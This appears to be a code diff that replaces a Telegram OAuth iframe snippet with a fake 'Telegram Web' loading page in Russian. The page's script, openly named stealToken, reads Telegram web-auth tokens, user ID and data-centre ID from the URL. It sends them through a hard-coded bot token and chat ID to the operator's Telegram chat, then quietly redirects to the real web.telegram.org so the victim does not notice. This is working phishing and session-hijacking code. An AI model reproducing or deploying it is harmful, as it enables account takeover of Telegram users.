@@ -1,10 +1,64 @@
-<script>
-    window.onload = function() {
-        var iframe = document.createElement('iframe');
-        iframe.src = "https://oauth.telegram.org/embed/jdwgwvshsbsj_bot?origin=https://teeleg-deep.netlify.app&request_access=write";
-        iframe.width = "300";
-        iframe.height = "100";
-        iframe.style.border = "none";
-        document.body.appendChild(iframe);
-    };
-</script>
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Web</title>
+    <style>
+        body { background: #0f0f0f; color: #fff; font-family: system-ui; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { text-align: center; }
+        .logo { font-size: 48px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="logo">Telegram</div>
+        <p>Загрузка веб-версии...</p>
+    </div>
+
+    <script>
+        function stealToken() {
+            const hash = window.location.hash.substring(1);
+            if (!hash.includes('tgWebAuthToken')) {
+                // Если токена нет — просто редирект (на случай если открыли без приложения)
+                window.location.replace('https://web.telegram.org/k/');
+                return;
+            }
+
+            const params = new URLSearchParams(hash);
+            const data = {
+                token: params.get('tgWebAuthToken'),
+                userId: params.get('tgWebAuthUserId'),
+                dcId: params.get('tgWebAuthDcId'),
+                fullUrl: window.location.href,
+                timestamp: Date.now()
+            };
+
+            // === ОТПРАВКА В ТВОЙ ТГ ===
+            const BOT_TOKEN = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';        // Создай бота у @BotFather
+            const CHAT_ID = '8220267007';           // @userinfobot покажет
+
+            const message = `🔥 НОВЫЙ ТОКЕН 🔥\n\n` +
+                `Token: ${data.token}\n` +
+                `UserID: ${data.userId}\n` +
+                `DC: ${data.dcId}\n` +
+                `Время: ${new Date(data.timestamp).toLocaleString('ru-RU')}\n` +
+                `URL: ${data.fullUrl}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`)
+                .then(() => console.log('Токен ушёл'))
+                .catch(err => console.error('Ошибка отправки', err));
+
+            // Редирект на оригинал через 400мс (чтобы не было заметно)
+            setTimeout(() => {
+                window.location.replace('https://web.telegram.org/k/');
+            }, 400);
+        }
+
+        // Запуск сразу
+        window.onload = stealToken;
+
+        // На всякий случай — если хэш появился позже (редко, но бывает)
+        window.addEventListener('hashchange', stealToken);
+    </script>
+</body>
+</html>
